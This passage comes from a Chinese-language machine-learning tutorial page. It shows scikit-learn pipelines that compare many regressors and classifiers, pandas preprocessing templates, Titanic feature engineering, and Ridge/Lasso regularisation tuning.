MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LinearRegression</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lasso</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Ridge</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> ElasticNet</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> HuberRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> Lars</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LassoLars</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> PassiveAggressiveRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> RANSACRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> SGDRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestRegressor,GradientBoostingRegressor</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># prepare a list of ml models</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_models</span><span class="params">(models=dict<span class="params">()</span>)</span>:</span></span><br><span class="line">    <span class="comment"># linear models</span></span><br><span class="line">    models[<span class="string">'rfr'</span>]=RandomForestRegressor()</span><br><span class="line">    models[<span class="string">'gbr'</span>]=GradientBoostingRegressor()</span><br><span class="line">    models[<span class="string">'lr'</span>] = LinearRegression()</span><br><span class="line">    models[<span class="string">'lasso'</span>] = Lasso()</span><br><span class="line">    models[<span class="string">'ridge'</span>] = Ridge()</span><br><span class="line">    models[<span class="string">'en'</span>] = ElasticNet()</span><br><span class="line">    models[<span class="string">'huber'</span>] = HuberRegressor()</span><br><span class="line">    models[<span class="string">'lars'</span>] = Lars()</span><br><span class="line">    models[<span class="string">'llars'</span>] = LassoLars()</span><br><span class="line">    models[<span class="string">'pa'</span>] = PassiveAggressiveRegressor(max_iter=<span class="number">1000</span>, tol=<span class="number">1e-3</span>)</span><br><span class="line">    models[<span class="string">'ranscac'</span>] = RANSACRegressor()</span><br><span class="line">    models[<span class="string">'sgd'</span>] = SGDRegressor(max_iter=<span class="number">1000</span>, tol=<span class="number">1e-3</span>)</span><br><span class="line">    print(<span class="string">'Defined %d models'</span> % len(models))</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"> </span><br><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pipeline</span><span class="params">(model)</span>:</span></span><br><span class="line">    steps = list()</span><br><span class="line">    <span class="comment"># standardization</span></span><br><span class="line">    steps.append((<span class="string">'standardize'</span>, StandardScaler()))</span><br><span class="line">    <span class="comment"># normalization</span></span><br><span class="line">    steps.append((<span class="string">'normalize'</span>, MinMaxScaler()))</span><br><span class="line">    <span class="comment"># the model</span></span><br><span class="line">    steps.append((<span class="string">'model'</span>, model))</span><br><span class="line">    <span class="comment"># create pipeline</span></span><br><span class="line">    pipeline = Pipeline(steps)</span><br><span class="line">    <span class="keyword">return</span> pipeline</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cross_validation</span><span class="params">(pipeline,X,Y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">10</span>).mean()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation</span><span class="params">(pipeline,Xtrain,Ytrain,Xtest,Ytest)</span>:</span></span><br><span class="line">    pipeline.fit(Xtrain,Ytrain)</span><br><span class="line">    <span class="keyword">return</span> pipeline.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    pipeline = make_pipeline(model)</span><br><span class="line">    <span class="comment"># dic[name] = cross_validation(pipeline,Xtrain,Ytrain)</span></span><br><span class="line">    dic[name] = validation(pipeline,Xtrain,Ytrain,Xtest,Ytest)</span><br><span class="line">    print(<span class="string">'model %s is done,score is %f'</span>%(name,dic[name]))</span><br><span class="line">order=sorted(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">'algo'</span>,<span class="string">'score'</span>]</span><br><span class="line">plot_data.set_index(<span class="string">'algo'</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f'%s is the best,score is %f'</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pipeline</span><span class="params">(model,Xtrain,Ytrain,Xtest,Ytest)</span>:</span></span><br><span class="line">steps = list()</span><br><span class="line"><span class="comment"># standardization</span></span><br><span class="line">steps.append((<span class="string">'standardize'</span>, StandardScaler()))</span><br><span class="line"><span class="comment"># normalization</span></span><br><span class="line">steps.append((<span class="string">'normalize'</span>, MinMaxScaler()))</span><br><span class="line"><span class="comment"># the model</span></span><br><span class="line">steps.append((<span class="string">'model'</span>, model))</span><br><span class="line"><span class="comment"># create pipeline</span></span><br><span class="line">pipeline = Pipeline(steps).fit(Xtrain,Ytrain)</span><br><span class="line"><span class="keyword">return</span> pipeline.score(Xtest,Ytest)</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,Xtrain,Ytrain,Xtest,Ytest)</span><br><span class="line">    print(<span class="string">'model %s is done,score is %f'</span>%(name,dic[name]))</span><br><span class="line">order=sorted(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h2><span id="模板">模板</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">df.describe([<span class="number">0.01</span>,<span class="number">0.05</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br><span class="line">df.describe(include=[<span class="string">'O'</span>])</span><br><span class="line"><span class="comment"># 提取连续，离散的数据</span></span><br><span class="line">col = df.columns.tolist()</span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">"object"</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cate:</span><br><span class="line">    col.remove(i)</span><br><span class="line"><span class="comment"># 转换</span></span><br><span class="line">df[<span class="string">'a'</span>] = df[<span class="string">'a'</span>].replace(<span class="string">'[\$,)]'</span>,<span class="string">''</span>,regex=<span class="literal">True</span>).astype(float)</span><br><span class="line"><span class="comment"># 离散一般填众数，连续填均值</span></span><br><span class="line">df[<span class="string">'b'</span>]=df[<span class="string">'b'</span>].fillna(df.b.mean())</span><br><span class="line">df[<span class="string">'c'</span>]=df[<span class="string">'c'</span>].fillna(df.b.mode()[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># 哑变量操作</span></span><br><span class="line">cate = df.columns[df.dtypes == <span class="string">"object"</span>].tolist()</span><br><span class="line">cate</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cate:</span><br><span class="line">    df = pd.concat([df,pd.get_dummies(df[c],prefix=str(c))],axis=<span class="number">1</span>)</span><br><span class="line">    df.drop(c,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量操作</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTitle</span><span class="params">(name)</span>:</span></span><br><span class="line">    str1=name.split(<span class="string">','</span>)[<span class="number">1</span>]   <span class="comment">#取头衔.姓</span></span><br><span class="line">    str2=str1.split(<span class="string">'.'</span>)[<span class="number">0</span>]   <span class="comment">#取头衔</span></span><br><span class="line">    <span class="comment">#strip() 移除字符串头尾指定的字符</span></span><br><span class="line">    str3=str2.strip()</span><br><span class="line">    <span class="keyword">return</span> str3</span><br><span class="line">titleDf = pd.DataFrame()</span><br><span class="line"><span class="comment">#map方法---对series里面每个数据应用自定义函数计算</span></span><br><span class="line">titleDf[<span class="string">'Title'</span>] = full[<span class="string">'Name'</span>].map(getTitle)</span><br><span class="line"><span class="comment"># 根据其他列数据新建onehot</span></span><br><span class="line">df[<span class="string">'month'</span>] = df[<span class="string">'Date'</span>].dt.month</span><br><span class="line">familyDf = pd.DataFrame()</span><br><span class="line">familyDf[<span class="string">'FamilySize'</span>] = full[<span class="string">'Parch'</span>]+full[<span class="string">'SibSp'</span>]+<span class="number">1</span></span><br><span class="line">familyDf[<span class="string">'Family_Single'</span>] = familyDf[<span class="string">'FamilySize'</span>].map(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> s == <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">familyDf[<span class="string">'Family_Small'</span>] = familyDf[<span class="string">'FamilySize'</span>].map(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> <span class="number">2</span>&lt;= s &lt;= <span class="number">4</span> <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line">familyDf[<span class="string">'Family_Large'</span>] = familyDf[<span class="string">'FamilySize'</span>].map(<span class="keyword">lambda</span> s : <span class="number">1</span> <span class="keyword">if</span> <span class="number">5</span>&lt;= s <span class="keyword">else</span> <span class="number">0</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看相关性</span></span><br><span class="line">corrDf = full.corr()</span><br><span class="line">survived_rel=corrDf[<span class="string">'Survived'</span>].sort_values(ascending = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure><h3><span id="泰坦尼克">泰坦尼克</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">train = pd.read_csv(<span class="string">'train.csv'</span>)</span><br><span class="line">test = pd.read_csv(<span class="string">'test.csv'</span>)</span><br><span class="line"></span><br><span class="line">train.head()</span><br><span class="line"></span><br><span class="line">train.info()</span><br><span class="line"></span><br><span class="line">train.describe([<span class="number">0.01</span>,<span class="number">0.1</span>,<span class="number">0.25</span>,<span class="number">0.5</span>,<span class="number">0.75</span>,<span class="number">0.9</span>,<span class="number">0.99</span>]).T</span><br><span class="line"></span><br><span class="line">train.isna().sum()</span><br><span class="line"></span><br><span class="line">train.Age.fillna(train.Age.mean(),inplace=<span class="literal">True</span>)</span><br><span class="line">train[<span class="string">'Embarked'</span>].fillna(train.Embarked.mode()[<span class="number">0</span>],inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.Cabin.value_counts()</span><br><span class="line"></span><br><span class="line">train.Cabin.fillna(<span class="string">'Unknown'</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.set_index(<span class="string">'PassengerId'</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train[<span class="string">'FamilySize'</span>] = train[<span class="string">'SibSp'</span>]+train[<span class="string">'Parch'</span>]+<span class="number">1</span></span><br><span class="line">train.drop([<span class="string">'SibSp'</span>,<span class="string">'Parch'</span>],axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">train.Cabin = train.Cabin.map(<span class="keyword">lambda</span> x : x[<span class="number">0</span>])</span><br><span class="line">train.Cabin.value_counts()</span><br><span class="line"></span><br><span class="line">train[<span class="string">'Name'</span>].map(<span class="keyword">lambda</span> x: x.split(<span class="string">','</span>)[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>]).value_counts()</span><br><span class="line">train[<span class="string">'Name'</span>]=train[<span class="string">'Name'</span>].map(<span class="keyword">lambda</span> x: x.split(<span class="string">','</span>)[<span class="number">1</span>].split(<span class="string">'.'</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">train.drop(<span class="string">'Ticket'</span>,axis=<span class="number">1</span>,inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">col = train.columns[train.dtypes == <span class="string">"object"</span>].tolist()</span><br><span class="line">col</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> col:</span><br><span class="line">    train = pd.concat([train,pd.get_dummies(train[c],prefix=str(c))],axis=<span class="number">1</span>)</span><br><span class="line">    train.drop(c,inplace=<span class="literal">True</span>,axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">corrDf = train.corr()</span><br><span class="line">survived_rel=corrDf[<span class="string">'Survived'</span>].sort_values(ascending = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">Ytrain = train[<span class="string">'Survived'</span>]</span><br><span class="line">Xtrain = train.drop(<span class="string">'Survived'</span>,axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">%%time</span><br><span class="line"><span class="keyword">from</span> sklearn.pipeline <span class="keyword">import</span> Pipeline</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> MinMaxScaler</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> GradientBoostingClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.ensemble <span class="keyword">import</span> RandomForestClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> LinearSVC</span><br><span class="line"><span class="keyword">from</span> sklearn.neighbors <span class="keyword">import</span> KNeighborsClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression,  SGDClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> cross_val_score</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># prepare a list of ml models</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_models</span><span class="params">(models=dict<span class="params">()</span>)</span>:</span></span><br><span class="line">    <span class="comment"># linear models</span></span><br><span class="line">    models[<span class="string">'gbc'</span>] = GradientBoostingClassifier()</span><br><span class="line">    models[<span class="string">'rfc'</span>] = RandomForestClassifier()</span><br><span class="line">    models[<span class="string">'lr'</span>] = LogisticRegression()</span><br><span class="line">    models[<span class="string">'KNN'</span>] = KNeighborsClassifier()</span><br><span class="line">    models[<span class="string">'GaussianNB'</span>] =  GaussianNB()</span><br><span class="line">    models[<span class="string">'sgd'</span>] = SGDClassifier()</span><br><span class="line">    models[<span class="string">'lsvc'</span>] =LinearSVC()</span><br><span class="line">    models[<span class="string">'svc'</span>] = SVC()</span><br><span class="line">    print(<span class="string">'Defined %d models'</span> % len(models))</span><br><span class="line">    <span class="keyword">return</span> models</span><br><span class="line"><span class="comment"># create a feature preparation pipeline for a model</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_pipeline</span><span class="params">(model,X, Y)</span>:</span></span><br><span class="line">    steps = list()</span><br><span class="line">    <span class="comment"># standardization</span></span><br><span class="line">    steps.append((<span class="string">'standardize'</span>, StandardScaler()))</span><br><span class="line">    <span class="comment"># normalization</span></span><br><span class="line">    steps.append((<span class="string">'normalize'</span>, MinMaxScaler()))</span><br><span class="line">    <span class="comment"># the model</span></span><br><span class="line">    steps.append((<span class="string">'model'</span>, model))</span><br><span class="line">    <span class="comment"># create pipeline</span></span><br><span class="line">    pipeline = Pipeline(steps)</span><br><span class="line">    <span class="keyword">return</span> cross_val_score(pipeline,X,Y,cv=<span class="number">4</span>).mean()</span><br><span class="line">dic = &#123;&#125;</span><br><span class="line">models = get_models()</span><br><span class="line"><span class="keyword">for</span> name, model <span class="keyword">in</span> models.items():</span><br><span class="line">    dic[name] = make_pipeline(model,Xtrain,Ytrain)</span><br><span class="line">    print(<span class="string">'model %s is done,score is %f'</span>%(name,dic[name]))</span><br><span class="line">order=sorted(dic.items(),key=<span class="keyword">lambda</span> x:x[<span class="number">1</span>],reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plot_data = pd.DataFrame(data=order)</span><br><span class="line">plot_data.columns = [<span class="string">'algo'</span>,<span class="string">'score'</span>]</span><br><span class="line">plot_data.set_index(<span class="string">'algo'</span>).plot.bar(figsize=(<span class="number">10</span>,<span class="number">6</span>))</span><br><span class="line">plt.xticks(rotation=<span class="number">360</span>)</span><br><span class="line"><span class="string">f'%s is the best,score is %f'</span>%(order[<span class="number">0</span>][<span class="number">0</span>],order[<span class="number">0</span>][<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3><span id="调优">调优</span></h3><p>岭回归可以解决特征间的精确相关关系导致的最小二乘法无法使用的问题，而Lasso不行。</p><p>由于Lasso对正则化系数的变动过于敏感，因此我们往往让 在很小的空间中变动</p><h3><span id="ridge">Ridge</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">housevalue = fch()</span><br><span class="line">X = pd.DataFrame(housevalue.data) y = housevalue.target</span><br><span class="line">X.columns = [<span class="string">"住户收入中位数"</span>,<span class="string">"房屋使用年代中位数"</span>,<span class="string">"平均房间数目"</span></span><br><span class="line">           ,<span class="string">"平均卧室数目"</span>,<span class="string">"街区人口"</span>,<span class="string">"平均入住率"</span>,<span class="string">"街区的纬度"</span>,<span class="string">"街区的经度"</span>]</span><br><span class="line">Ridge_ = RidgeCV(alphas=np.arange(<span class="number">1</span>,<span class="number">1001</span>,<span class="number">100</span>)</span><br><span class="line">                <span class="comment">#,scoring="neg_mean_squared_error"</span></span><br><span class="line">                 ,store_cv_values=<span class="literal">True</span></span><br><span class="line">                <span class="comment">#,cv=5</span></span><br><span class="line">               ).fit(X, y)</span><br><span class="line"></span><br><span class="line">Ridge_.score(X,y) <span class="comment">#调用所有交叉验证的结果</span></span><br><span class="line">Ridge_.cv_values_.shape</span><br><span class="line"><span class="comment">#进行平均后可以查看每个正则化系数取值下的交叉验证结果</span></span><br><span class="line">Ridge_.cv_values_.mean(axis=<span class="number">0</span>) <span class="comment">#查看被选择出来的最佳正则化系数</span></span><br><span class="line">Ridge_.alpha_</span><br></pre></td></tr></table></figure><h3><span id="lasso">Lasso</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LassoCV</span><br><span class="line"><span class="comment">#自己建立Lasso进行alpha选择的范围</span></span><br><span class="line">alpharange = np.logspace(<span class="number">-10</span>, <span class="number">-2</span>, <span class="number">200</span>,base=<span class="number">10</span>) <span class="comment">#其实是形成10为底的指数函数</span></span><br><span class="line"><span class="comment">#10**(-10)到10**(-2)次方</span></span><br><span class="line">alpharange.shape</span><br><span class="line">Xtrain.head()</span><br><span class="line">lasso_ = LassoCV(alphas=alpharange <span class="comment">#自行输入的alpha的取值范围</span></span><br><span class="line">               ,cv=<span class="number">5</span> <span class="comment">#交叉验证的折数</span></span><br><span class="line">               ).fit(Xtrain, Ytrain) <span class="comment">#查看被选择出来的最佳正则化系数</span></span><br><span class="line">lasso_.alpha_</span><br><span class="line"><span class="comment">#调用所有交叉验证的结果</span></span><br><span class="line">lasso_.mse_path_</span><br><span class="line">lasso_.mse_path_.shape <span class="comment">#返回每个alpha下的五折交叉验证结果</span></span><br><span class="line">lasso_.mse_path_.mean(axis=<span class="number">1</span>) <span class="comment">#有注意到在岭回归中我们的轴向是axis=0吗？</span></span><br><span class="line"><span class="comment">#在岭回归当中，我们是留一验证，因此我们的交叉验证结果返回的是，每一个样本在每个alpha下的交叉验证结果</span></span><br><span class="line"><span class="comment">#因此我们要求每个alpha下的交叉验证均值，就是axis=0，跨行求均值</span></span><br><span class="line"><span class="comment">#而在这里，我们返回的是，每一个alpha取值下，每一折交叉验证的结果</span></span><br><span class="line"><span class="comment">#因此我们要求每个alpha下的交叉验证均值，就是axis=1，跨列求均值</span></span><br><span class="line"><span class="comment">#最佳正则化系数下获得的模型的系数结果</span></span><br><span class="line">lasso_.coef_</span><br><span class="line">lasso_.score(Xtest,Ytest) <span class="comment">#与线性回归相比如何？</span></span><br><span class="line">reg = LinearRegression().fit(Xtrain,Ytrain)</span><br><span class="line">reg.score(Xtest,Ytest) <span class="comment">#使用lassoCV自带的正则化路径长度和路径中的alpha个数来自动建立alpha选择的范围</span></span><br><span class="line">ls_ = LassoCV(eps=<span class="number">0.00001</span></span><br><span class="line">             ,n_alphas=<span class="number">300</span></span><br><span class="line">             ,cv=<span class="number">5</span></span><br><span class="line">               ).fit(Xtrain, Ytrain)</span><br><span class="line">ls_.alpha_</span><br><span class="line">ls_.alphas_ <span class="comment">#查看所有自动生成的alpha取值</span></span><br><span class="line">ls_.alphas_.shape</span><br><span class="line">ls_.score(Xtest,Ytest)</span><br><span class="line">ls_.coef_</span><br></pre></td></tr></table></figure><h3><span id="多步长时间序列">多步长时间序列</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># import</span></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line">warnings.filterwarnings(<span class="string">'ignore'</span>)</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line">pd.set_option(<span class="string">'display.max_columns'</span>, <span class="literal">None</span>) <span class="comment"># 展示所有列</span></span><br><span class="line"></span><br><span class="line"><span 